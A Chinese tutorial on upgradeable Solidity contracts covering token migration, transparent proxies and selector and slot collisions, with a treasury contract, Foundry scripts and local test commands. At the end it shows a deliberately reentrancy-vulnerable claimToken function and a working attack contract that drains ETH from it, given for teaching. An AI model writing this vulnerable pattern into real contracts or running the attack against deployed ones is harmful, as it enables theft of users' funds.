# 一.内容提要

- 不可以升级的合约如何进行合约升级
- 透明代理升级
- UUPS 升级
- 钻石代理
- 信标代理



# 二.不可以升级的合约如何进行合约升级

这种情况一般是废弃旧合约，将旧合约的功能和数据迁移到新的合约，A 项目发行个叫  AToken(AToken 合约不可以升级)。

原始的合约：发行代币，普通的 ERC20 代码，没有 mint 和 burn,  也没有治理的功能

- 代币销毁：直接将 token 转到 0 地址
- 若想 mint,  这个合约支持不了
- 想改 token Symbol 和 Name, 这个合约也支持不了
- Token 信息
  - Name=DappLink
  - Symbol=DLK
  - TotalSupply=10亿

新的合约：拥有历史的 ERC20 合约的所有功能，同时还支持以下这些功能

- 代币可以调用 burn 销毁，而不是转到 0 地址
- 在一定时间之内，我可以按照一定比例去 mint token 
- 合约加入治理功能
- 新的 Token 信息
  - Name=TheWeb3
  - Symbol=TWT
  - TotalSupply=50亿

从老合约升级(迁移)到新合约的步骤

- 第一步：部署新的合约
- 第二步：开发一个 migrate 合约，migrate 用于这两个代币的互换

![合约迁移](imgs/合约迁移.png)



- 代表项目
  - BIT----->MNT 
  - LET(Ethereum)----->LET(Achain)
  - Kcash(Ethereum)----->Kcash(Achain)

# 三.透明代理升级

![透明代理](imgs/透明代理.png)

- Proxy 合约：数据合约，当用户调用 Proxy 合约时，是通过 delegateCall 方式调度逻辑，执行的是逻辑合约的逻辑，但是改变数据状态是代理合约（上下文环境）。
- 当发生合约升级的时候，其实就是给代理合约执行一个新的执行逻辑合约, 新的逻辑合约生效，旧的逻辑合约废弃
- 一般通过 ProxyAdmin 合约管理整个升级过程
- 代理合约一直都是一个合约，不会发生变化，仅仅只是升级之后指向不同的逻辑合约

### 1. 选择器冲突

智能合约中，函数选择器（selector）是函数签名的哈希的前4个字节。例如`mint(address account)`的选择器为`bytes4(keccak256("mint(address)"))`，也就是`0x6a627842`。由于函数选择器仅有4个字节，范围很小，因此两个不同的函数可能会有相同的选择器，例如下面两个函数：

```
// 选择器冲突的例子 
contract Foo {    
	function burn(uint256) external {}    
	function collate_propagate_storage(bytes16) external {} 
}
```

示例中，函数`burn()`和`collate_propagate_storage()`的选择器都为`0x42966c68`，是一样的，这种情况被称为“选择器冲突”。在这种情况下，`EVM`无法通过函数选择器分辨用户调用哪个函数，因此该合约无法通过编译。

由于代理合约和逻辑合约是两个合约，就算他们之间存在“选择器冲突”也可以正常编译，这可能会导致很严重的安全事故。举个例子，如果逻辑合约的`a`函数和代理合约的升级函数的选择器相同，那么管理人就会在调用`a`函数的时候，将代理合约升级成一个黑洞合约，后果不堪设想。

目前，有两个可升级合约标准解决了这一问题：透明代理`Transparent Proxy`和通用可升级代理`UUPS`。

透明代理的逻辑非常简单：管理员可能会因为“函数选择器冲突”，在调用逻辑合约的函数时，误调用代理合约的可升级函数。那么限制管理员的权限，不让他调用任何逻辑合约的函数，就能解决冲突：

- **管理员**变为工具人，**仅能调用代理合约的可升级函数对合约升级**，不能通过回调函数调用逻辑合约。
- **其它用户不能调用可升级函数，但是可以调用逻辑合约的函数**。

### 2. 可升级合约里面 Slot 注意点（防止插槽冲突）

- Contract A 

```Plain
Contract A {
    uint256 public a;
    uint256 public b;
    uint256 public c;
    uint256 public e;
    
    mapping(uint256=>address) public d;
    
    constructor() {
        ....
    }
      
    function initialize() public {
        ....
    }
    
    uint256[99] private slot;
}
```

- Contract B

```Plain
Contract B {
    uint256 public a1;
    uint256 public b1;
    uint256 public c1;
    
    mapping(uint256=>address) public d1;
    
    constructor() {
        ....
    }
      
    function initialize() public {
        ....
    }
    
    uint256[99] private slot;
}
```

- Contract C

```Plain
Contract C is A, B {
      uint256 public a2;
      uint256 public b2;
      uint256 public c2;
      
    
      constructor() {
          _disableInitializers();
      }
      
      function initialize() public {
          ....
      }
}
```

C 合约是一个可升级合约,  逻辑合约状态变量和proxy合约一致，防止插槽冲突

### 3. 基于透明代理可升级国库合约实战案例

暂时无法在Lark文档外展示此内容

- ITreasureManager.sol 抽象接口合约

```javascript
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITreasureManager {
    function depositETH() external payable returns (bool);
    function depositERC20(IERC20 tokenAddress, uint256 amount) external returns (bool);
    function grantRewards(address tokenAddress, address receiptAddress, uint256 amount) external;
    function claimAllTokens() external;
    function claimToken(address tokenAddress) external;
    function withdrawETH(address payable withdrawAddress, uint256 amount) external payable returns (bool);
    function withdrawERC20(IERC20 tokenAddress, address withdrawAddress, uint256 amount) external returns (bool);
    function setTokenWhiteList(address tokenAddress) external;
    function setWithdrawManager(address _withdrawManager) external;
    function queryRewards(address tokenAddress) external view returns(uint256);
    function getTokenWhiteList() external view returns(address[] memory);

    function getValue() external pure returns(uint256);
}
```

- TreasureManager 国库合约

```java
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/AccessControlUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/ReentrancyGuardUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./interface/ITreasureManager.sol";

contract TreasureManager is Initializable, OwnableUpgradeable, AccessControlUpgradeable, ReentrancyGuardUpgradeable, ITreasureManager {
    using SafeERC20 for IERC20;

    address public constant ethAddress = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);

    address public treasureManager;
    address public withdrawManager;

    address[] public tokenWhiteList;

    mapping(address => uint256) public tokenBalances;
    mapping(address => mapping(address => uint256)) public userRewardAmounts;

    error IsZeroAddress();

    event DepositToken(
        address indexed tokenAddress,
        address indexed sender,
        uint256 amount
    );

    event WithdrawToken(
        address indexed tokenAddress,
        address sender,
        address withdrawAddress,
        uint256 amount
    );

    event GrantRewardTokenAmount(
        address indexed tokenAddress,
        address granter,
        uint256 amount
    );

    event WithdrawManagerUpdate(
        address indexed withdrawManager
    );

    modifier onlyTreasureManager() {
        require(msg.sender == address(treasureManager), "TreasureManager.onlyTreasureManager");
        _;
    }

    modifier onlyWithdrawManager() {
        require(msg.sender == address(withdrawManager), "TreasureManager.onlyWithdrawer");
        _;
    }

    function initialize(address _initialOwner, address _treasureManager, address _withdrawManager) public initializer {
        treasureManager = _treasureManager;
        withdrawManager = _withdrawManager;
        _transferOwnership(_initialOwner);
    }

    receive() external payable {
        depositETH();
    }

    function depositETH() public payable nonReentrant returns (bool) {
        tokenBalances[ethAddress] += msg.value;
        emit DepositToken(
            ethAddress,
            msg.sender,
            msg.value
        );
        return true;
    }

    function depositERC20(IERC20 tokenAddress, uint256 amount) external returns (bool) {
        tokenBalances[address(tokenAddress)] += amount;
        tokenAddress.safeTransferFrom(msg.sender, address(this), amount);
        emit DepositToken(
            address(tokenAddress),
            msg.sender,
            amount
        );
        return true;
    }

    function grantRewards(address tokenAddress, address granter, uint256 amount) external onlyTreasureManager {
        require(address(tokenAddress) != address(0) && granter != address(0), "Invalid address");
        userRewardAmounts[granter][address(tokenAddress)] += amount;
        emit GrantRewardTokenAmount(address(tokenAddress), granter, amount);
    }

    function claimAllTokens() external {
        for (uint256 i = 0; i < tokenWhiteList.length; i++) {
            address tokenAddress = tokenWhiteList[i];
            uint256 rewardAmount = userRewardAmounts[msg.sender][tokenAddress];
            if (rewardAmount > 0) {
                userRewardAmounts[msg.sender][tokenAddress] = 0;
                tokenBalances[tokenAddress] -= rewardAmount;
                if (tokenAddress == ethAddress) {
                    (bool success, ) = msg.sender.call{value: rewardAmount}("");
                    require(success, "ETH transfer failed");
                } else {
                    IERC20(tokenAddress).safeTransfer(msg.sender, rewardAmount);
                }
            }
        }
    }

    function claimToken(address tokenAddress) external {
        require(tokenAddress != address(0), "Invalid token address");
        uint256 rewardAmount = userRewardAmounts[msg.sender][tokenAddress];
        require(rewardAmount > 0, "No reward available");
        userRewardAmounts[msg.sender][tokenAddress] = 0;
        tokenBalances[tokenAddress] -= rewardAmount;
        if (tokenAddress == ethAddress) {
            (bool success, ) = msg.sender.call{value: rewardAmount}("");
            require(success, "ETH transfer failed");
        } else {
            IERC20(tokenAddress).safeTransfer(msg.sender, rewardAmount);
        }
    }

    function withdrawETH(address payable withdrawAddress, uint256 amount) external payable onlyWithdrawManager returns (bool) {
        require(address(this).balance >= amount, "Insufficient ETH balance in contract");
        (bool success, ) = withdrawAddress.call{value: amount}("");
        if (!success) {
            return false;
        }
        tokenBalances[ethAddress] -= amount;
        emit WithdrawToken(
            ethAddress,
            msg.sender,
            withdrawAddress,
            amount
        );
        return true;
    }

    function withdrawERC20(IERC20 tokenAddress, address withdrawAddress, uint256 amount) external onlyWithdrawManager returns (bool) {
        require(tokenBalances[address(tokenAddress)] >= amount, "Insufficient token balance in contract");
        tokenAddress.safeTransfer(withdrawAddress, amount);
        tokenBalances[address(tokenAddress)] -= amount;
        emit WithdrawToken(
            address(tokenAddress),
            msg.sender,
            withdrawAddress,
            amount
        );
        return true;
    }

    function setTokenWhiteList(address tokenAddress) external onlyTreasureManager {
        if(tokenAddress == address(0)) {
            revert IsZeroAddress();
        }
        tokenWhiteList.push(tokenAddress);
    }

    function getTokenWhiteList() external view returns (address[] memory) {
        return tokenWhiteList;
    }

    function setWithdrawManager(address _withdrawManager) external onlyOwner {
        withdrawManager = _withdrawManager;
        emit WithdrawManagerUpdate(
            withdrawManager
        );
    }

    function queryRewards(address _tokenAddress) public view returns (uint256) {
        return userRewardAmounts[msg.sender][_tokenAddress];
    }
    
    // V2 版本加的代码
    function getValue() external pure returns(uint256) {
        return 10000;
    }
}
```

- EmptyContract  空合约

```Plain
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract EmptyContract {
    function foo() public pure returns (uint256) {
        return 0;
    }
}
```

- TreasureManagerScript 部署脚本

```java
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {TreasureManager} from "../src/TreasureManager.sol";

import "forge-std/Vm.sol";
import {Script, console } from "forge-std/Script.sol";
import "@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

import "../src/TreasureManager.sol";
import "../test/EmptyContract.sol";

contract TreasureManagerScript is Script {
    EmptyContract public emptyContract;
    TreasureManager public treasureManager;
    TreasureManager public treasureManagerImplementation;
    ProxyAdmin public treasureManagerProxyAdmin;

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address deployerAddress = vm.addr(deployerPrivateKey);

        vm.startBroadcast(deployerPrivateKey);

        emptyContract = new EmptyContract();
        TransparentUpgradeableProxy proxyTreasureManager = new TransparentUpgradeableProxy(address(emptyContract), deployerAddress, "");

        treasureManager = TreasureManager(payable(address(proxyTreasureManager)));

        treasureManagerImplementation = new TreasureManager();
        treasureManagerProxyAdmin = ProxyAdmin(getProxyAdminAddress(address(proxyTreasureManager)));

        treasureManagerProxyAdmin.upgradeAndCall(
            ITransparentUpgradeableProxy(address(treasureManager)),
            address(treasureManagerImplementation),
            abi.encodeWithSelector(
                TreasureManager.initialize.selector,
                msg.sender,
                msg.sender,
                msg.sender
            )
        );

        console.log("address=====", address(treasureManager));
        console.log("treasureManagerProxyAdmin=====", address(treasureManagerProxyAdmin));

        vm.stopBroadcast();
    }

    function getProxyAdminAddress(address proxy) internal view returns (address) {
        address CHEATCODE_ADDRESS = 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D;
        Vm vm = Vm(CHEATCODE_ADDRESS);
        bytes32 adminSlot = vm.load(proxy, ERC1967Utils.ADMIN_SLOT);
        return address(uint160(uint256(adminSlot)));
    }
}
```

- TreasureManagerV2Script 升级脚本

```java
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {TreasureManager} from "../src/TreasureManager.sol";

import "forge-std/Vm.sol";
import {Script, console } from "forge-std/Script.sol";
import "@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

import "../src/TreasureManager.sol";
import "../test/EmptyContract.sol";

contract TreasureManagerV2Script is Script {
    TreasureManager public treasureManagerV2;
    TreasureManager public treasureManagerV2Implementation;
    ProxyAdmin public treasureManagerV2ProxyAdmin;

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployerPrivateKey);

        treasureManagerV2Implementation = new TreasureManager();

        treasureManagerV2 = TreasureManager(payable(0x5FC8d32690cc91D4c39d9d3abcBD16989F875707));
        treasureManagerV2ProxyAdmin = ProxyAdmin(getProxyAdminAddress(0x5FC8d32690cc91D4c39d9d3abcBD16989F875707));

        treasureManagerV2ProxyAdmin.upgradeAndCall(
            ITransparentUpgradeableProxy(address(treasureManagerV2)),
            address(treasureManagerV2Implementation),
            hex""
        );

        vm.stopBroadcast();
    }

    function getProxyAdminAddress(address proxy) internal view returns (address) {
        address CHEATCODE_ADDRESS = 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D;
        Vm vm = Vm(CHEATCODE_ADDRESS);
        bytes32 adminSlot = vm.load(proxy, ERC1967Utils.ADMIN_SLOT);
        return address(uint160(uint256(adminSlot)));
    }
}
```

- 测试命令总结

~~~shell
```
Available Accounts
==================

(0) 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 (10000.000000000000000000 ETH)
(1) 0x70997970C51812dc3A010C7d01b50e0d17dc79C8 (10000.000000000000000000 ETH)
(2) 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC (10000.000000000000000000 ETH)
(3) 0x90F79bf6EB2c4f870365E785982E1f101E93b906 (10000.000000000000000000 ETH)
(4) 0x15d34AAf54267DB7D7c367839AAf71A00a2C6A65 (10000.000000000000000000 ETH)
(5) 0x9965507D1a55bcC2695C58ba16FB37d819B0A4dc (10000.000000000000000000 ETH)
(6) 0x976EA74026E726554dB657fA54763abd0C3a0aa9 (10000.000000000000000000 ETH)
(7) 0x14dC79964da2C08b23698B3D3cc7Ca32193d9955 (10000.000000000000000000 ETH)
(8) 0x23618e81E3f5cdF7f54C3d65f7FBc0aBf5B21E8f (10000.000000000000000000 ETH)
(9) 0xa0Ee7A142d267C1f36714E4a8F75612F20a79720 (10000.000000000000000000 ETH)

Private Keys
==================

(0) 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
(1) 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
(2) 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a
(3) 0x7c852118294e51e653712a81e05800f419141751be58f605c371e15141b007a6
(4) 0x47e179ec197488593b187f80a00eb0da91f1b9d0b13f8733639f19c30a34926a
(5) 0x8b3a350cf5c34c9194ca85829a2df0ec3153be0318b5e2d3348e872092edffba
(6) 0x92db14e403b83dfe3df233f83dfa3a0d7096f21ca9b0d6d6b8d88b2b4ec1564e
(7) 0x4bbbf85ce3377467afe5d46f804f221813b2bb87f24d81f60f1fcdbf7cbf4356
(8) 0xdbda1821b80551c9d65939329250298aa3472ba22feea921c0cf5d620ea67b97
(9) 0x2a871d0798f97d79848a013d4936a73bf4cc922c825d33c1cf7073dff6d409c6
```

```
0xB7f8BC63BbcaD18155201308C8f3540b07f84F5e  token

0x5FC8d32690cc91D4c39d9d3abcBD16989F875707  treasure

0xCe85503De9399D4dECa3c0b2bb3e9e7CFCBf9C6B proxyAdmin
```


### Build

```shell
$ forge build
```

### Test

```shell
$ forge test
```

### Format

```shell
$ forge fmt
```

### Gas Snapshots

```shell
$ forge snapshot
```

### Anvil

```shell
$ anvil
```

### Deploy

```shell
forge script ./script/TreasureManagerScript.s.sol:TreasureManagerScript --rpc-url 127.0.0.1:8545 --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 --broadcast
```

### Cast

```shell
cast call --rpc-url 127.0.0.1:8545 0x5FC8d32690cc91D4c39d9d3abcBD16989F875707 "treasureManager()(address)"
cast call --rpc-url 127.0.0.1:8545 0x5FC8d32690cc91D4c39d9d3abcBD16989F875707 "tokenBalances(address)(uint256)" 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE

# eth 充值
cast send --rpc-url 127.0.0.1:8545 --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 0x5FC8d32690cc91D4c39d9d3abcBD16989F875707 --value 1000000000000000000

# erc20 充值
cast call --rpc-url 127.0.0.1:8545 0xB7f8BC63BbcaD18155201308C8f3540b07f84F5e "balanceOf(address)(uint256)" 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
cast send --rpc-url 127.0.0.1:8545 --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 0xB7f8BC63BbcaD18155201308C8f3540b07f84F5e "approve(address,uint256)" 0x5FC8d32690cc91D4c39d9d3abcBD16989F875707 100000000000000000
cast send --rpc-url 127.0.0.1:8545 --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 0x5FC8d32690cc91D4c39d9d3abcBD16989F875707 "depositERC20(address,uint256)" 0xB7f8BC63BbcaD18155201308C8f3540b07f84F5e 10000000000000000

# grantRewards
cast send --rpc-url 127.0.0.1:8545 --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 0x5FC8d32690cc91D4c39d9d3abcBD16989F875707 "grantRewards(address,address,uint256)" 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE 0xee2E207D30383430a815390431298EBa3c1C8c2d 1000000000000000000
cast call --rpc-url 127.0.0.1:8545 0x5FC8d32690cc91D4c39d9d3abcBD16989F875707 "queryRewards(address)(uint256)" 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE --from 0xee2E207D30383430a815390431298EBa3c1C8c2d

# eth balance
cast balance 0xee2E207D30383430a815390431298EBa3c1C8c2d --rpc-url 127.0.0.1:8545

# claim
cast send --rpc-url 127.0.0.1:8545 --private-key 0xc30e09a462d429803c0592db0c52a9cb0bdcbf80fb6cfe3ea351c9fd67e103c1 0x5FC8d32690cc91D4c39d9d3abcBD16989F875707 "claimToken(address)" 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE

# 判断一个地址是否是合约地址
cast code 0xCe85503De9399D4dECa3c0b2bb3e9e7CFCBf9C6B --rpc-url 127.0.0.1:8545

cast call 0x5FC8d32690cc91D4c39d9d3abcBD16989F875707 --rpc-url 127.0.0.1:8545 "getValue()(uint256)"
```

```
forge script ./script/TreasureManagerV2Script.s.sol:TreasureManagerV2Script --rpc-url 127.0.0.1:8545 --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 --broadcast
```

### Help

```shell
$ forge --help
$ anvil --help
$ cast --help
```
~~~

- 重入攻击（先状态改变再交易）

```javascript
function claimToken(address tokenAddress) external {
    require(tokenAddress != address(0), "Invalid token address");
    uint256 rewardAmount = userRewardAmounts[msg.sender][tokenAddress];
    require(rewardAmount > 0, "No reward available");
    if (tokenAddress == ethAddress) {
        (bool success, ) = msg.sender.call{value: rewardAmount}("");
        require(success, "ETH transfer failed");
    } else {
        IERC20(tokenAddress).safeTransfer(msg.sender, rewardAmount);
    }
    userRewardAmounts[msg.sender][tokenAddress] = 0; //X
    tokenBalances[tokenAddress] -= rewardAmount; //X
}
```

- 攻击的 POC 

```java
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../src/TreasureManager.sol";

contract AttackTreasureManager {
    TreasureManager public treasureManager;
    address payable public owner;
    uint256 public attackAmount;

    constructor(address _treasureManager) {
        treasureManager = TreasureManager(payable(_treasureManager));
        owner = payable(msg.sender);
    }

    function attackClaimToken(address tokenAddress) external {
        attackAmount = 0;
        treasureManager.claimToken(tokenAddress);
    }

    receive() external payable {
        reentrance();
    }

    fallback() external payable {
        reentrance();
    }

    function reentrance() internal {
        address ethAddress = treasureManager.ethAddress();
        uint left = treasureManager.userRewardAmounts(
            address(this),
            ethAddress
        );
        attackAmount += left;
        if (treasureManager.tokenBalances(ethAddress) > attackAmount + left) {
            treasureManager.claimToken(ethAddress);
        }
    }

    function withdraw() public {
        payable(owner).transfer(address(this).balance);
    }
}
```